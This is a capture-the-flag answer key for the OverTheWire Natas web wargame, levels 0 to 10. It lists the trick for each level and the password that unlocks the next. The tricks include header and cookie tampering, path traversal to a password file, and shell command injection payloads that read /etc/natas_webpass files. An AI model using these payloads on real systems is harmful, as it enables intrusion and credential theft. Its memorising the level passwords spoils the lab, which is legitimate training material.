# 0

In the comments

passowrd: gtVrDuiDfck831PqWsLEZy5gyDz1clto

# 1
In the comments

password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

# 2
http://natas2.natas.labs.overthewire.org/files/users.txt

password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

# 3
http://natas3.natas.labs.overthewire.org/robots.txt
```
User-agent: *
Disallow: /s3cr3t/
```
password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

# 4
Add `Referer` header

Referer: http://natas5.natas.labs.overthewire.org/

password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

# 5
document.cookie = "loggedin=1"

password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

# 6
`http://natas6.natas.labs.overthewire.org/includes/secret.inc`

```
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```
password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

# 7
`http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`

password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

# 8
```bash
echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -D
oubWYf2kBq
```
password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

# 9
sh injection
```bash
; cat /etc/natas_webpass/natas10;
```
password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

#10
```
c /etc/natas_webpass/natas11
```
password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

